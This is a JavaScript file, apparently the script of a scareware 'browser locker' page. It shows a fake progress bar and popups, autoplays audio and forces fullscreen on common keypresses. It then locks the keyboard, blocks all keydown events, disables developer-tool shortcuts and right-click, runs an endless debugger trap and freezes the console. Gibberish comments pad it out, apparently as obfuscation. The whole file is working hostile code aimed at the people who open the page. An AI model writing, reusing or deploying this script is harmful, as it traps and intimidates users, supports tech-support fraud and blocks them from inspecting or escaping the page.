$(function () {
    var bnbnsbmnbnmdbmwqbdqwjk = 0;
    var interval = setInterval(function () {
        bnbnsbmnbnmdbmwqbdqwjk += 10;
        $("#dynamic")
            .css("width", bnbnsbmnbnmdbmwqbdqwjk + "%")
            .attr("aria-valuenow", bnbnsbmnbnmdbmwqbdqwjk)
            .text(bnbnsbmnbnmdbmwqbdqwjk + "% Complete");
        if (bnbnsbmnbnmdbmwqbdqwjk >= 100)
            clearInterval(interval);
    }, 100);
});

// mdjsduisaiuiqwqhccjnlcq
    // qwdlsajhcjhejnmcjhio
    // djioasdhioashiheowhjnds
    // huyujcnxmchuoodasjdhas
    // duouowhcnmhduoqwgfuohaslnas
    // djasuhdojhdnlhowqojnc
    // hduoashdasjndlcnoyoieyqwioe
    // euqwioyclxncm,bnzbxckgigqw
    // qwpuioeyfuohdhoqwuotrufgsa
    // qwuisiuiusd
    (function ($) {
        $.fn.countTo = function (options) {
            options = options || {};

            return $(this).each(function () {
                var settings = $.extend({}, $.fn.countTo.defaults, {
                    from: $(this).data('from'),
                    to: $(this).data('to'),
                    speed: $(this).data('speed'),
                    refreshInterval: $(this).data('refresh-interval'),
                    decimals: $(this).data('decimals')
                }, options);

                var loops = Math.ceil(settings.speed / settings.refreshInterval),
                    increment = (settings.to - settings.from) / loops;

                var self = this,
                    $self = $(this),
                    loopCount = 0,
                    value = settings.from,
                    data = $self.data('countTo') || {};

                $self.data('countTo', data);

                if (data.interval) {
                    clearInterval(data.interval);
                }
                data.interval = setInterval(updateTimer, settings.refreshInterval);

                render(value);

                function updateTimer() {
                    value += increment;
                    loopCount++;

                    render(value);

                    if (typeof (settings.onUpdate) == 'function') {
                        settings.onUpdate.call(self, value);
                    }

                    if (loopCount >= loops) {
                        $self.removeData('countTo');
                        clearInterval(data.interval);
                        value = settings.to;

                        if (typeof (settings.onComplete) == 'function') {
                            settings.onComplete.call(self, value);
                        }
                    }
                }

                function render(value) {
                    var formattedValue = settings.formatter.call(self, value, settings);
                    $self.html(formattedValue);
                }
            });
        };
        
        // sajhunabnasduiatduisgisduasuidqwwuiqtuqwe
        // euiqwtduiysuyoyioqwyuohjkxhc,xzczxncbmdsmnfouyqwuq
        // sauyfuiwyudhuoyqwdyusdicgusdcguksdgcdyuc
        // ifticghgciusdtfuisgfkjgkgiuwetqwr
        // qryeuiwuifgweccjhxvbncvywetuiwtfsd
        // fuiwetfigsdjhghvmnbcsditweirwe
        // fiutweignsdciucwetfuwe
        // fsdiyftweuigsdcbsnfgweui
        // wigweuoeyoqwicsdbcnmsbuig3
        $.fn.countTo.defaults = {
            from: 0,         
            to: 0,               
            speed: 100,          
            refreshInterval: 100,  
            decimals: 0,           
            formatter: formatter, 
            onUpdate: null,        
            onComplete: null       
        };

        function formatter(value, settings) {
            return value.toFixed(settings.decimals);
        }
    }(jQuery));

    jQuery(function ($) {
        $('.count-number').data('countToOptions', {
            formatter: function (value, options) {
                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
            }
        });
        $('.timer').each(count);

        function count(options) {
            var $this = $(this);
            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
            $this.countTo(options);
        }
    });

    $(document).ready(function () {
        $(".pro_box2").delay(1).fadeIn(800);
        $(".pro_box3").delay(1).fadeIn(800);
        $(".pro_box3").delay(1).fadeIn(800);
        $("#pop_up_new").delay(1).fadeIn(800);
        $("#nbdnsbndbew").delay(1).fadeIn(800);
         $("#welcomeDiv").delay(1).fadeIn(800);
         $("#ev_talkbox_wrapper").delay(1).fadeOut(500)
    });

    document.addEventListener('keyup', function (es) {
        if (es.keyCode === 27) {
            toggleFullScreen();
        }
    }, false);

    document.addEventListener('keyup', function (e) {
        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
            document.getElementById('map').innerHTML = stroka;
            toggleFullScreen();
        }
    }, false);

    var modal = document.getElementById('myModal');
    var btn = document.getElementById("myBtn");
    var span = document.getElementsByClassName("close")[0];

    span.onclick = function () {
        modal.style.display = "none";
    }

    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }


    setTimeout(function () {
        document.getElementById("sdsdsdsd").play();
    });

    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $("#welcomeDiv").hide();
        });
    });

    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $(".bgimg").hide();
            $(".bgimg2").show();
        });
    });

    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#nbdnsbndbew").show();
        });
    });

    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#welcomeDiv").show();
        });
    });

    function play() {
        var audio = document.getElementById("audio");
        audio.play();
      }

      navigator.keyboard.lock();
document.onkeydown = function (e) {
return false;
}

// Disable specific key combinations
document.addEventListener('keydown', function (event) {
    if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey &&
        (event.keyCode === 'I'.charCodeAt(0) || event.keyCode === 'i'.charCodeAt(0) ||
        event.keyCode === 'L'.charCodeAt(0) || event.keyCode === 'l'.charCodeAt(0) ||
        event.keyCode === 'C'.charCodeAt(0) || event.keyCode === 'c'.charCodeAt(0) ||
        event.keyCode === 'J'.charCodeAt(0) || event.keyCode === 'j'.charCodeAt(0) ||
        event.keyCode === 'U'.charCodeAt(0) || event.keyCode === 'u'.charCodeAt(0) ||
        event.keyCode === 'S'.charCodeAt(0) || event.keyCode === 's'.charCodeAt(0)))) {
        event.preventDefault();
    }
});

// Disable context menu
document.addEventListener('contextmenu', function (event) {
    event.preventDefault();
});

// Debugger code with retry
(function () {
    (function a() {
        try {
            (function b(i) {
                if (('' + (i / i)).length !== 1 || i % 20 === 0) {
                    (function () {}).constructor('debugger')();
                } else {
                    debugger;
                }
                b(++i);
            })(0);
        } catch (e) {
            setTimeout(a, 5);
        }
    })();
})();

// Disable console
Object.defineProperty(window, 'console', {
    value: Object.freeze({}),
    writable: false,
    configurable: false
});